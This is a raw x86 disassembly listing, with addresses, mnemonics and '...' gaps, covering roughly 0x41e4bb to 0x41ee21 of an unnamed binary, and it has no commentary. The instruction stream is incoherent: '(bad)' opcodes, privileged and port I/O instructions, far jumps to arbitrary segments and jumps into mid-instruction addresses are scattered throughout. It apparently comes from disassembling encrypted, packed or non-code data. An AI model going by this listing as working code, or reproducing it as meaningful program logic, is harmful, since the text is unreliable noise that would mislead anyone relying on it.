  41e4bb:	xchg   BYTE PTR [ebp+0x1c],cl
  41e4be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4bf:	jns    0x41e483
  41e4c1:	cld    
  41e4c2:	inc    eax
  41e4c3:	mov    edx,0x1d9dfd8c
  41e4c8:	ja     0x41e4a9
  41e4ca:	cmp    al,BYTE PTR [ebx+esi*4-0x2c1ce875]
  41e4d1:	inc    ecx
  41e4d2:	xchg   esi,eax
  41e4d3:	sub    al,0x9f
  41e4d5:	add    BYTE PTR [esi-0x5d],ah
  41e4d8:	fstp   TBYTE PTR ds:[edi]
  41e4db:	or     ecx,DWORD PTR [ebp-0x5c]
  41e4de:	inc    edx
  41e4df:	mov    ah,0xf5
  41e4e1:	in     eax,0xb2
  41e4e3:	xor    al,0x31
  41e4e5:	mov    ecx,0xd6ec47be
  41e4ea:	adc    ah,BYTE PTR [ebp-0x2b]
  41e4ed:	shl    edx,1
  41e4ef:	stos   BYTE PTR es:[edi],al
  41e4f0:	mov    esi,0x4ad2ca08
  41e4f5:	add    DWORD PTR [ecx+0x67],0xbc31042b
  41e4fc:	or     BYTE PTR [edi-0xfa9600b],0x52
  41e503:	loope  0x41e575
  41e505:	test   al,0x5b
  41e507:	loope  0x41e531
  41e509:	es mov dl,0x74
  41e50c:	add    ecx,DWORD PTR [esp+edx*2]
  41e50f:	adc    eax,0xe44ee37
  41e514:	mov    esi,0xd0892a8a
  41e519:	outs   dx,BYTE PTR ds:[esi]
  41e51a:	cs ins BYTE PTR es:[edi],dx
  41e51c:	stos   DWORD PTR es:[edi],eax
  41e51d:	xor    ecx,DWORD PTR [ecx]
  41e51f:	mov    ch,0xc0
  41e521:	mov    ah,0x7b
  41e523:	mov    ecx,0xbb58d330
  41e528:	out    0xf5,eax
  41e52a:	push   ds
  41e52b:	popa   
  41e52c:	mov    dl,0xa7
  41e52e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e52f:	jmp    0x41e57b
  41e531:	xchg   ebp,eax
  41e532:	mov    dh,BYTE PTR [ebx-0x21]
  41e535:	shr    BYTE PTR [esi-0x37],0xe
  41e539:	jno    0x41e53c
  41e53b:	cmp    ecx,edi
  41e53d:	sar    DWORD PTR [edi-0x60],cl
  41e540:	hlt    
  41e541:	shl    DWORD PTR [edi+0x48],cl
  41e544:	pop    esi
  41e545:	sar    DWORD PTR [edx+0x0],cl
  41e548:	ja     0x41e4ee
  41e54a:	xor    al,0x15
  41e54c:	aas    
  41e54d:	push   ebp
  41e54e:	retf   
  41e54f:	das    
  41e550:	sbb    al,0x13
  41e552:	add    al,0x9c
  41e554:	add    BYTE PTR [ebx],al
  41e556:	add    BYTE PTR [edx],ch
  41e558:	stos   DWORD PTR es:[edi],eax
  41e559:	ret    
  41e55a:	xlat   BYTE PTR ds:[ebx]
  41e55b:	mul    DWORD PTR [ebx+0x25]
  41e55e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e55f:	adc    al,BYTE PTR [edi]
  41e561:	push   edi
  41e562:	popa   
  41e563:	dec    esp
  41e564:	mov    eax,ds:0x11f96b60
  41e569:	sbb    ch,BYTE PTR [ebp+0xa369]
	...
  41e5d3:	add    BYTE PTR [eax],al
  41e5d5:	add    BYTE PTR [eax],ah
  41e5d7:	push   0xffffffcb
  41e5d9:	dec    ebx
  41e5da:	retf   
  41e5db:	jmp    0x41e57d
  41e5dd:	imul   ebp,ebx,0xffffffb1
  41e5e0:	aaa    
  41e5e1:	je     0x41e5eb
  41e5e3:	int3   
  41e5e4:	add    BYTE PTR [esi],bh
  41e5e6:	clc    
  41e5e7:	inc    ebp
  41e5e8:	add    DWORD PTR [eax],eax
  41e5ea:	inc    DWORD PTR [eax]
  41e5ec:	add    BYTE PTR [eax],al
  41e5ee:	mov    al,0x4d
  41e5f0:	or     cl,BYTE PTR [esp+ecx*8]
  41e5f3:	jno    0x41e597
  41e5f5:	cmp    cl,ah
  41e5f7:	dec    ebp
  41e5f8:	sbb    edi,DWORD PTR [esi-0x71c3fcb9]
  41e5fe:	adc    eax,0x8b039eda
  41e603:	ret    
  41e604:	push   edx
  41e605:	xlat   BYTE PTR ds:[ebx]
  41e606:	pusha  
  41e607:	pop    esp
  41e608:	idiv   DWORD PTR [edx+0x5a]
  41e60b:	sub    eax,0xe74178db
  41e610:	outs   dx,DWORD PTR ds:[esi]
  41e611:	loop   0x41e5fc
  41e613:	fsubrp st(6),st
  41e615:	jp     0x41e5ca
  41e617:	addr16 pusha 
  41e619:	pop    ecx
  41e61a:	in     al,0xc8
  41e61c:	dec    edi
  41e61d:	xchg   cl,bh
  41e61f:	mov    ah,0xb9
  41e621:	push   ds
  41e622:	fcomp  DWORD PTR [ebp-0x29aca564]
  41e628:	leave  
  41e629:	xor    BYTE PTR [edi],dl
  41e62b:	push   es
  41e62c:	or     esp,DWORD PTR [ebp+0xe]
  41e62f:	pushf  
  41e630:	pop    dx
  41e632:	cmc    
  41e633:	pop    es
  41e634:	es ja  0x41e657
  41e637:	push   eax
  41e638:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e639:	push   ecx
  41e63a:	sahf   
  41e63b:	jbe    0x41e5f5
  41e63d:	mov    ecx,0xc24f55ce
  41e642:	ins    BYTE PTR es:[edi],dx
  41e643:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e644:	xchg   ecx,eax
  41e645:	loope  0x41e699
  41e647:	mov    ah,0xd5
  41e649:	in     al,dx
  41e64a:	mov    bh,0x9b
  41e64c:	push   edx
  41e64d:	push   ebp
  41e64e:	inc    edi
  41e64f:	sbb    edi,DWORD PTR [eax*4-0x69b187ca]
  41e656:	add    dl,BYTE PTR ds:0x12d968a0
  41e65c:	ret    0x6012
  41e65f:	repnz xor edi,ebp
  41e662:	mov    WORD PTR [eax+0x6e],?
  41e665:	mov    esp,0xbdebc707
  41e66a:	rol    BYTE PTR [edx],0x56
  41e66d:	loop   0x41e65d
  41e66f:	clc    
  41e670:	ja     0x41e6e4
  41e672:	xlat   BYTE PTR ds:[ebx]
  41e673:	push   0xa7b13177
  41e678:	mov    dh,0x3e
  41e67a:	adc    DWORD PTR [esi+0x11],0x10b3e5a8
  41e681:	pandn  mm4,mm6
  41e684:	retf   
  41e685:	mov    ecx,DWORD PTR [esi+0x13]
  41e688:	push   ebp
  41e689:	sub    DWORD PTR [esi-0x5483b47d],ecx
  41e68f:	inc    edx
  41e690:	fcmovne st,st(3)
  41e692:	cld    
  41e693:	jnp    0x41e6b6
  41e695:	int    0xfe
  41e697:	daa    
  41e698:	mov    ebp,0xf3d2d3b0
  41e69d:	xchg   edi,eax
  41e69e:	mov    al,0x5e
  41e6a0:	hlt    
  41e6a1:	iret   
  41e6a2:	push   ds
  41e6a3:	xlat   BYTE PTR ds:[ebx]
  41e6a4:	xor    ah,bl
  41e6a6:	call   0x815f:0x95c4ab25
  41e6ad:	inc    ecx
  41e6ae:	and    eax,DWORD PTR [ebx-0x7b]
  41e6b1:	inc    ebp
  41e6b2:	or     esi,ebx
  41e6b4:	adc    DWORD PTR [edx-0x67],0x3a15579d
  41e6bb:	inc    eax
  41e6bc:	add    DWORD PTR [ecx-0x1fbb7ef],0x65415913
  41e6c6:	jl     0x41e72c
  41e6c8:	adc    edx,0x637a40f3
  41e6ce:	push   edx
  41e6cf:	in     al,dx
  41e6d0:	adc    ebp,eax
  41e6d2:	int    0x2e
  41e6d4:	fild   WORD PTR [ebp+0xc8e7008]
  41e6da:	or     al,0x8c
  41e6dc:	cdq    
  41e6dd:	outs   dx,BYTE PTR cs:[esi]
  41e6df:	js     0x41e74d
  41e6e1:	add    eax,eax
  41e6e3:	out    0xaf,eax
  41e6e5:	jecxz  0x41e747
  41e6e7:	ins    DWORD PTR es:[edi],dx
  41e6e8:	inc    BYTE PTR [eax+0xb54a2b]
	...
  41e756:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41e75c:	cmc    
  41e75d:	cwde   
  41e75e:	xchg   esp,eax
  41e75f:	push   0x37
  41e761:	sub    eax,DWORD PTR [ecx-0x83d16b7]
  41e767:	inc    esi
  41e768:	add    DWORD PTR [eax],eax
  41e76a:	inc    DWORD PTR [eax]
  41e76c:	add    BYTE PTR [eax],al
  41e76e:	pop    esi
  41e76f:	mov    bl,bh
  41e771:	mov    ebx,0xe03b71ec
  41e776:	pop    esi
  41e777:	daa    
  41e778:	out    dx,al
  41e779:	adc    DWORD PTR [ebx],esp
  41e77b:	mov    al,ds:0x7e1557d7
  41e780:	pop    ds
  41e781:	sti    
  41e782:	outs   dx,DWORD PTR ds:[esi]
  41e783:	pop    ecx
  41e784:	loope  0x41e730
  41e786:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e787:	fild   WORD PTR [ebx-0x34]
  41e78a:	mov    al,ds:0x18e29caa
  41e78f:	pop    ebp
  41e790:	sub    eax,0x4ebab25e
  41e795:	sbb    DWORD PTR [edx+esi*2+0x3a20735],eax
  41e79c:	xchg   BYTE PTR [esp+ebx*4],bl
  41e79f:	mov    edx,DWORD PTR [eax]
  41e7a1:	lahf   
  41e7a2:	push   esi
  41e7a3:	cmp    BYTE PTR [eax+0x70],al
  41e7a6:	fwait
  41e7a7:	neg    al
  41e7a9:	outs   dx,BYTE PTR ds:[esi]
  41e7aa:	or     bl,cl
  41e7ac:	mov    edx,0xed1416fa
  41e7b1:	inc    ebx
  41e7b2:	std    
  41e7b3:	aam    0xda
  41e7b5:	push   ebp
  41e7b6:	and    edi,DWORD PTR [eax+0x783acfed]
  41e7bc:	inc    ebx
  41e7bd:	dec    edi
  41e7be:	jo     0x41e7e2
  41e7c0:	xchg   esi,eax
  41e7c1:	ss or  ch,al
  41e7c4:	add    esp,ebp
  41e7c6:	out    dx,al
  41e7c7:	mov    ah,0x9
  41e7c9:	rol    DWORD PTR [eax+0x37],0x80
  41e7cd:	lods   eax,DWORD PTR ds:[esi]
  41e7ce:	sub    DWORD PTR [ebp+0x37],esi
  41e7d1:	(bad)  
  41e7d2:	jb     0x41e781
  41e7d4:	pop    esp
  41e7d5:	push   edx
  41e7d6:	push   cs
  41e7d7:	push   eax
  41e7d8:	pop    edi
  41e7d9:	xlat   BYTE PTR ds:[ebx]
  41e7da:	pop    ebx
  41e7db:	jbe    0x41e79c
  41e7dd:	ss jg  0x41e799
  41e7e0:	nop
  41e7e1:	repz ss push ss
  41e7e4:	ret    
  41e7e5:	push   ecx
  41e7e6:	xchg   esi,eax
  41e7e7:	call   0xfc1cc6f2
  41e7ec:	sbb    BYTE PTR [edx+0x15],0x6e
  41e7f0:	ret    0x7a12
  41e7f3:	gs mov ebx,0xf90f98d9
  41e7f9:	iret   
  41e7fa:	repz jae 0x41e79f
  41e7fd:	ins    BYTE PTR es:[edi],dx
  41e7fe:	cmp    eax,ebp
  41e800:	ds (bad) 
  41e802:	repz cmc 
  41e804:	in     eax,dx
  41e805:	xor    cl,BYTE PTR [edi+0x4f]
  41e808:	mov    ebx,0x3653d04b
  41e80d:	sbb    al,BYTE PTR [edx-0x36]
  41e810:	sar    edx,1
  41e812:	in     eax,dx
  41e813:	push   esi
  41e814:	retf   0x48a7
  41e817:	adc    eax,0x3b615b17
  41e81c:	cmc    
  41e81d:	addr16 jno 0x41e855
  41e820:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e821:	lea    esi,[ebx+ebx*1+0x77e7c5f5]
  41e828:	xor    DWORD PTR [edi-0x7e115bc7],ecx
  41e82e:	test   BYTE PTR [edi],dh
  41e830:	xchg   BYTE PTR ds:0x537e224c,ah
  41e836:	ret    
  41e837:	ficom  DWORD PTR [edx+0x7a]
  41e83a:	adc    bl,ah
  41e83c:	jns    0x41e85d
  41e83e:	pop    ss
  41e83f:	or     bh,BYTE PTR [ecx+0x3e1980aa]
  41e845:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e846:	sbb    ecx,DWORD PTR [ecx]
  41e848:	push   esp
  41e849:	push   es
  41e84a:	jmp    0x41e7f8
  41e84c:	nop
  41e84d:	imul   ebx,DWORD PTR [edx+0x50],0x9d217fad
  41e854:	jg     0x41e7e9
  41e856:	pop    ds
  41e857:	es mov eax,0x5bd1792f
  41e85d:	jl     0x41e7eb
  41e85f:	sub    BYTE PTR [ebp+0x50],ch
  41e862:	cld    
  41e863:	sbb    DWORD PTR [esi-0x4f0b6aef],ebp
  41e869:	loop   0x41e880
  41e86b:	ins    BYTE PTR es:[edi],dx
  41e86c:	xchg   esi,eax
	...
  41e8d5:	add    BYTE PTR ds:0x9e5c8a39,ch
  41e8db:	(bad)  
  41e8dc:	(bad)  
  41e8dd:	jns    0x41e94e
  41e8df:	xor    al,0xcc
  41e8e1:	jg     0x41e91e
  41e8e3:	pop    eax
  41e8e4:	(bad)  
  41e8e5:	lock test BYTE PTR [edi+0x1],0x0
  41e8ea:	inc    DWORD PTR [eax]
  41e8ec:	add    BYTE PTR [eax],al
  41e8ee:	sub    eax,0xc5dcfc95
  41e8f3:	lahf   
  41e8f4:	test   esp,edx
  41e8f6:	push   esp
  41e8f7:	lahf   
  41e8f8:	mov    al,ds:0xb1cf4136
  41e8fd:	mov    DWORD PTR [ecx+0x16],edx
  41e900:	jp     0x41e8c7
  41e902:	rol    DWORD PTR [esi-0x65055659],0xb9
  41e909:	test   DWORD PTR [eax-0x3b],edi
  41e90c:	ror    DWORD PTR [edi],0xf9
  41e90f:	or     ebp,DWORD PTR [ecx]
  41e911:	lods   al,BYTE PTR ds:[esi]
  41e912:	xchg   ebx,eax
  41e913:	adc    eax,0x9808640c
  41e918:	loopne 0x41e8df
  41e91a:	jnp    0x41e960
  41e91c:	popf   
  41e91d:	outs   dx,BYTE PTR ds:[esi]
  41e91e:	sbb    DWORD PTR [edi-0x4c],eax
  41e921:	test   eax,0xdf17359c
  41e926:	mov    eax,ds:0x29d70680
  41e92b:	icebp  
  41e92c:	dec    esi
  41e92d:	test   DWORD PTR [eax+0x11],0xbb7abba9
  41e934:	dec    edx
  41e935:	sbb    eax,0x699ac49d
  41e93a:	ins    BYTE PTR es:[edi],dx
  41e93b:	cmc    
  41e93c:	in     al,dx
  41e93d:	mov    ebx,0x27b79efe
  41e942:	sub    al,BYTE PTR [ecx-0x53]
  41e945:	orps   xmm5,XMMWORD PTR [ebp-0x1]
  41e949:	jmp    0x41e9c7
  41e94b:	ds in  eax,0xda
  41e94e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e94f:	inc    edi
  41e950:	cli    
  41e951:	(bad)  
  41e952:	adc    al,0x54
  41e954:	push   edx
  41e955:	sub    bh,BYTE PTR [ecx+0x68a0e5a3]
  41e95b:	jmp    0xdbd0:0x2787a963
  41e962:	loope  0x41e95c
  41e964:	scas   al,BYTE PTR es:[edi]
  41e965:	mov    ch,0x48
  41e967:	sub    BYTE PTR ds:0xd8d633d4,cl
  41e96d:	push   ds
  41e96e:	inc    edi
  41e96f:	sub    eax,0x830ca9ea
  41e974:	and    DWORD PTR [ebx-0x35d0c624],0x9e49fc8e
  41e97e:	scas   al,BYTE PTR es:[edi]
  41e97f:	loope  0x41e9a0
  41e981:	or     eax,0x8e9d439e
  41e986:	iret   
  41e987:	mov    ebp,0x698aa381
  41e98c:	aaa    
  41e98d:	xchg   ebp,eax
  41e98e:	and    DWORD PTR [ebp+0x285ccc48],eax
  41e994:	mov    ecx,0x1cf1e876
  41e999:	stos   BYTE PTR es:[edi],al
  41e99a:	lock mov al,0x7
  41e99d:	dec    edi
  41e99e:	loope  0x41e9b6
  41e9a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9a1:	adc    ah,dl
  41e9a3:	ja     0x41e97e
  41e9a5:	(bad)  
  41e9a6:	idiv   BYTE PTR [edi]
  41e9a8:	fs jo  0x41e93c
  41e9ab:	iret   
  41e9ac:	push   ebp
  41e9ad:	and    BYTE PTR [ecx-0x197c1006],0x84
  41e9b4:	mul    esp
  41e9b6:	lods   al,BYTE PTR ds:[esi]
  41e9b7:	repnz jecxz 0x41ea12
  41e9ba:	pop    ds
  41e9bb:	fist   WORD PTR [ecx-0x13]
  41e9be:	jle    0x41e9aa
  41e9c0:	jge    0x41ea0b
  41e9c2:	pop    ss
  41e9c3:	inc    edi
  41e9c4:	add    DWORD PTR [ecx],esi
  41e9c6:	(bad)  
  41e9c7:	out    0xb7,al
  41e9c9:	adc    eax,0xfc752b4f
  41e9ce:	jle    0x41ea1d
  41e9d0:	call   0x151a5f0d
  41e9d5:	ror    DWORD PTR [edi],cl
  41e9d7:	out    dx,eax
  41e9d8:	into   
  41e9d9:	jbe    0x41e9cb
  41e9db:	xchg   esi,eax
  41e9dc:	popa   
  41e9dd:	xchg   ebp,eax
  41e9de:	hlt    
  41e9df:	daa    
  41e9e0:	lea    esp,[edx+ebx*8-0x6ff2da37]
  41e9e7:	imul   esp,DWORD PTR [ebp+0xc],0x58
  41e9eb:	pusha  
  41e9ec:	loopne 0x41e9ee
	...
  41ea56:	js     0x41ea55
  41ea58:	ret    0xc766
  41ea5b:	jg     0x41ea59
  41ea5d:	dec    DWORD PTR [edi+0x67]
  41ea60:	rol    dl,1
  41ea62:	dec    ecx
  41ea63:	hlt    
  41ea64:	jo     0x41ea05
  41ea66:	cmc    
  41ea67:	dec    eax
  41ea68:	add    DWORD PTR [eax],eax
  41ea6a:	inc    DWORD PTR [eax]
  41ea6c:	add    BYTE PTR [eax],al
  41ea6e:	add    ah,bl
  41ea70:	je     0x41ea6e
  41ea72:	pusha  
  41ea73:	stc    
  41ea74:	lods   al,BYTE PTR ds:[esi]
  41ea75:	hlt    
  41ea76:	sbb    al,0x99
  41ea78:	or     DWORD PTR [edx-0x67],esi
  41ea7b:	pushaw 
  41ea7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea7e:	leave  
  41ea7f:	retf   0x6cef
  41ea82:	fcmovnbe st,st(3)
  41ea84:	adc    BYTE PTR [ebp-0x46],cl
  41ea87:	add    al,0x57
  41ea89:	retf   0xd5d2
  41ea8c:	cmp    eax,0xa51c6901
  41ea91:	ret    0x7c4c
  41ea94:	xlat   BYTE PTR ds:[ebx]
  41ea95:	jbe    0x41ea33
  41ea97:	and    eax,0x313ba77c
  41ea9c:	mov    BYTE PTR [esi+ebx*4],bl
  41ea9f:	stc    
  41eaa0:	(bad)  
  41eaa1:	repnz mov ebx,0x17f43a9
  41eaa7:	dec    ebp
  41eaa8:	ror    BYTE PTR [edx+0x6f],0x42
  41eaac:	sahf   
  41eaad:	(bad)  
  41eaae:	ja     0x41ea5f
  41eab0:	sbb    BYTE PTR [ecx-0x20880c38],bl
  41eab6:	retf   0x6ce5
  41eab9:	push   esp
  41eaba:	sub    eax,0x75769973
  41eabf:	outs   dx,DWORD PTR ds:[esi]
  41eac0:	aad    0x65
  41eac2:	xchg   BYTE PTR [ecx+0x590da084],al
  41eac8:	arpl   WORD PTR [esi],si
  41eaca:	enter  0xdd38,0xf0
  41eace:	ds jp  0x41ea9b
  41ead1:	lock lea edx,[ecx+0x6c]
  41ead5:	inc    ecx
  41ead6:	sbb    ch,dl
  41ead8:	sbb    BYTE PTR [edi+0x3b],0x90
  41eadc:	xor    al,0xf5
  41eade:	sahf   
  41eadf:	rol    BYTE PTR ds:0x1cfdc192,cl
  41eae5:	or     ecx,esi
  41eae7:	aaa    
  41eae8:	mov    ecx,0xf74cb625
  41eaed:	stos   BYTE PTR es:[edi],al
  41eaee:	jo     0x41eafa
  41eaf0:	jp     0x41eaec
  41eaf2:	sti    
  41eaf3:	push   esi
  41eaf4:	inc    ebp
  41eaf5:	push   edi
  41eaf6:	das    
  41eaf7:	jbe    0x41eb58
  41eaf9:	add    BYTE PTR [ebx+ebp*4],0x39
  41eafd:	jp     0x41eac5
  41eaff:	xor    BYTE PTR [bx],bh
  41eb02:	pop    ss
  41eb03:	xchg   esi,eax
  41eb04:	fwait
  41eb05:	into   
  41eb06:	std    
  41eb07:	pop    es
  41eb08:	pop    ebp
  41eb09:	je     0x41eb19
  41eb0b:	and    esp,DWORD PTR [ebx-0x67]
  41eb0e:	ret    
  41eb0f:	mov    bh,BYTE PTR [esi]
  41eb11:	cdq    
  41eb12:	pop    esi
  41eb13:	bound  esi,QWORD PTR [ebx]
  41eb15:	adc    DWORD PTR ds:0x5185c4f0,esi
  41eb1b:	retf   
  41eb1c:	in     al,0x30
  41eb1e:	mov    edi,0x8e9c31b9
  41eb23:	jne    0x41eb1a
  41eb25:	(bad)  
  41eb26:	jg     0x41eb18
  41eb28:	pop    ss
  41eb29:	or     ebx,DWORD PTR [ecx+0x68]
  41eb2c:	jne    0x41eb9b
  41eb2e:	retf   0x26c7
  41eb31:	rcl    ecx,1
  41eb33:	mov    bl,0x7b
  41eb35:	mov    edx,edx
  41eb37:	loopne 0x41eb28
  41eb39:	nop
  41eb3a:	add    al,0xfa
  41eb3c:	(bad)  
  41eb3d:	loop   0x41eba3
  41eb3f:	cdq    
  41eb40:	sbb    DWORD PTR [ebp+0x7d83656f],esp
  41eb46:	int3   
  41eb47:	mov    eax,0xfaaa34a5
  41eb4c:	jne    0x41ead4
  41eb4e:	push   eax
  41eb4f:	adc    DWORD PTR [edx-0x3664905b],0x0
  41eb56:	cmp    al,0x4
  41eb58:	repnz xor DWORD PTR [edi+eiz*2-0x4b31df38],0x69d73a2d
  41eb64:	ins    BYTE PTR es:[edi],dx
  41eb65:	cmp    eax,0x10afc546
  41eb6a:	xchg   esi,eax
  41eb6b:	dec    ebp
  41eb6c:	jo     0x41eb6e
	...
  41ebd6:	adc    ch,BYTE PTR [edi]
  41ebd8:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41ebdf:	out    0x9b,al
  41ebe1:	aad    0xe5
  41ebe3:	je     0x41ebe5
  41ebe5:	aam    0xf4
  41ebe7:	dec    ecx
  41ebe8:	add    DWORD PTR [eax],eax
  41ebea:	inc    DWORD PTR [eax]
  41ebec:	add    BYTE PTR [eax],al
  41ebee:	cmp    bh,BYTE PTR ss:[ecx+0x23]
  41ebf2:	cs pop esp
  41ebf4:	and    BYTE PTR [ecx-0x30],cl
  41ebf7:	ins    DWORD PTR es:[edi],dx
  41ebf8:	iret   
  41ebf9:	shl    BYTE PTR [edx+0x6f],1
  41ebfc:	out    0xcf,eax
  41ebfe:	fisub  WORD PTR [edx+ebp*4+0x43]
  41ec02:	fwait
  41ec03:	add    al,ah
  41ec05:	pushf  
  41ec06:	push   esp
  41ec07:	into   
  41ec08:	test   esp,0xb5216d71
  41ec0e:	test   DWORD PTR gs:[edx-0x5c],ecx
  41ec12:	test   BYTE PTR [eax+0x7],0x4
  41ec16:	rol    BYTE PTR [eax],cl
  41ec18:	jge    0x41ec0f
  41ec1a:	popf   
  41ec1b:	dec    edi
  41ec1c:	sub    al,0xeb
  41ec1e:	jmp    FWORD PTR [eax]
  41ec20:	scas   al,BYTE PTR es:[edi]
  41ec21:	sub    DWORD PTR [esi-0x2c553c89],edx
  41ec27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec28:	idiv   DWORD PTR [ebp-0x19]
  41ec2b:	lods   al,BYTE PTR ds:[esi]
  41ec2c:	inc    edx
  41ec2d:	mov    ds:0x7c143d06,eax
  41ec32:	xor    al,0xaa
  41ec34:	hlt    
  41ec35:	lea    edi,[ebx-0x65]
  41ec38:	mov    ds:0x5b65732a,eax
  41ec3d:	fwait
  41ec3e:	xchg   ecx,eax
  41ec3f:	loope  0x41ebd2
  41ec41:	aam    0x14
  41ec43:	out    0x15,al
  41ec45:	cli    
  41ec46:	pusha  
  41ec47:	mov    eax,0x6ca0ab7c
  41ec4c:	push   cs
  41ec4d:	enter  0x59c3,0x79
  41ec51:	int    0x1d
  41ec53:	test   DWORD PTR [esi-0x29],esi
  41ec56:	push   edi
  41ec57:	inc    edi
  41ec58:	in     eax,0x10
  41ec5a:	pop    ss
  41ec5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec5c:	loop   0x41ec90
  41ec5e:	sub    al,0x47
  41ec60:	dec    edi
  41ec61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec62:	jne    0x41ec7f
  41ec64:	std    
  41ec65:	scas   eax,DWORD PTR es:[edi]
  41ec66:	lds    eax,FWORD PTR [ebx+0x65]
  41ec69:	add    eax,0x84222145
  41ec6e:	cmp    al,0xc1
  41ec70:	add    BYTE PTR [edi],0xe2
  41ec73:	adc    BYTE PTR [edx],bh
  41ec75:	aas    
  41ec76:	sub    edx,esi
  41ec78:	jg     0x41ec16
  41ec7a:	push   esp
  41ec7b:	out    0x97,al
  41ec7d:	je     0x41ec1a
  41ec7f:	icebp  
  41ec80:	lods   eax,DWORD PTR ds:[esi]
  41ec81:	test   BYTE PTR [esi+0x71473a1f],0x60
  41ec88:	xor    edx,DWORD PTR cs:[ecx-0x1a]
  41ec8c:	sti    
  41ec8d:	sbb    al,0x16
  41ec8f:	sbb    eax,0x9bbc04aa
  41ec94:	add    ebp,DWORD PTR [esi-0x283a6344]
  41ec9a:	sbb    BYTE PTR [ecx+0x16],bh
  41ec9d:	pop    esp
  41ec9e:	push   ebx
  41ec9f:	mov    dh,ch
  41eca1:	out    0x42,al
  41eca3:	push   ds
  41eca4:	pop    ebx
  41eca5:	cmp    DWORD PTR [eax+0x14396ca1],eax
  41ecab:	sti    
  41ecac:	xchg   edx,eax
  41ecad:	or     eax,0x68460f6c
  41ecb2:	iret   
  41ecb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ecb4:	(bad)  
  41ecb5:	and    dh,cl
  41ecb7:	cmc    
  41ecb8:	imul   ebp,ecx,0xffffffd6
  41ecbb:	fdivr  st,st(4)
  41ecbd:	mov    ch,0x3a
  41ecbf:	mov    ebp,0xa3156d88
  41ecc4:	cmp    esp,esi
  41ecc6:	retf   0x4d7c
  41ecc9:	mov    cl,0xc8
  41eccb:	hlt    
  41eccc:	sbb    ebx,DWORD PTR [edx+0x4443e5af]
  41ecd2:	cmp    DWORD PTR [eax-0x6a],0x71ecb263
  41ecd9:	cli    
  41ecda:	jecxz  0x41ecf5
  41ecdc:	outs   dx,BYTE PTR ds:[esi]
  41ecdd:	mov    al,BYTE PTR [eax+edi*1+0x2d28679f]
  41ece4:	adc    ch,cl
  41ece6:	(bad)  [esi+0x71e65632]
  41ecec:	pushf  
	...
  41ed55:	add    BYTE PTR [ecx-0xf],al
  41ed58:	(bad)
  41ed5b:	hlt    
  41ed5c:	gs icebp 
  41ed5e:	dec    edi
  41ed5f:	adc    eax,0xaae85fd0
  41ed64:	adc    eax,esi
  41ed66:	repz dec edx
  41ed68:	add    DWORD PTR [eax],eax
  41ed6a:	inc    DWORD PTR [eax]
  41ed6c:	add    BYTE PTR [eax],al
  41ed6e:	or     al,0xbe
  41ed70:	mov    edx,0x73c61b4b
  41ed75:	sbb    ecx,DWORD PTR [edi+edx*2-0x72]
  41ed79:	jg     0x41edae
  41ed7b:	arpl   WORD PTR [ecx-0x73],sp
  41ed7e:	xor    edi,DWORD PTR [ebx-0x6fa1b5d2]
  41ed84:	enter  0x8f07,0x35
  41ed88:	ja     0x41ed31
  41ed8a:	jns    0x41edef
  41ed8c:	pop    ss
  41ed8d:	cdq    
  41ed8e:	rcl    DWORD PTR [ecx-0xd],cl
  41ed91:	gs stos DWORD PTR es:[edi],eax
  41ed93:	push   ds
  41ed94:	mov    ecx,0x8a0f9740
  41ed99:	dec    edx
  41ed9a:	mov    eax,ds:0xace264f6
  41ed9f:	mov    dh,0x48
  41eda1:	pusha  
  41eda2:	push   es
  41eda3:	cs clc 
  41eda5:	cdq    
  41eda6:	add    BYTE PTR [edx+ecx*4-0x3ebe24f8],cl
  41edad:	test   al,0xd3
  41edaf:	fld    DWORD PTR [edi-0x7f]
  41edb2:	add    DWORD PTR [edx-0x4687799c],edx
  41edb8:	add    eax,0x19e517fa
  41edbd:	je     0x41edc9
  41edbf:	test   BYTE PTR [edi-0x6b],dh
  41edc2:	(bad)  [esi]
  41edc4:	ret    
  41edc5:	stos   DWORD PTR es:[edi],eax
  41edc6:	stc    
  41edc7:	adc    al,BYTE PTR [esi+0x154fe32c]
  41edcd:	sub    esp,DWORD PTR [edi+0x5]
  41edd0:	sub    ebx,edi
  41edd2:	cdq    
  41edd3:	and    edi,DWORD PTR [edx-0x13]
  41edd6:	mov    bl,0x76
  41edd8:	push   esi
  41edd9:	into   
  41edda:	(bad)  
  41eddb:	adc    edi,DWORD PTR [esi+0x77]
  41edde:	stos   DWORD PTR es:[edi],eax
  41eddf:	mov    BYTE PTR [edx+0x7cadde3e],dl
  41ede5:	jp     0x41edb0
  41ede7:	or     esi,eax
  41ede9:	mov    cl,0xaa
  41edeb:	mov    al,ds:0xece4b35e
  41edf0:	sbb    esp,DWORD PTR [ecx+0x3163d4e4]
  41edf6:	out    dx,eax
  41edf7:	xchg   esp,eax
  41edf8:	push   edi
  41edf9:	ins    DWORD PTR es:[edi],dx
  41edfa:	mov    WORD PTR [ebx+0x395ee478],es
  41ee00:	dec    eax
  41ee01:	leave  
  41ee02:	or     eax,0x92f957cf
  41ee07:	out    dx,eax
  41ee08:	imul   esi,esp,0x58
  41ee0b:	jmp    FWORD PTR [ebp+0xe]
  41ee0e:	xrelease mov DWORD PTR [edx+eax*4-0x2e],eax
  41ee13:	mov    ah,0x91
  41ee15:	and    ch,BYTE PTR [edi+ebx*2]
  41ee18:	pushf  
  41ee19:	rcr    BYTE PTR [edx+edx*1+0x74],1
  41ee1d:	out    0xce,al
  41ee1f:	mov    BYTE PTR [ebx],al
  41ee21:	push   ebx
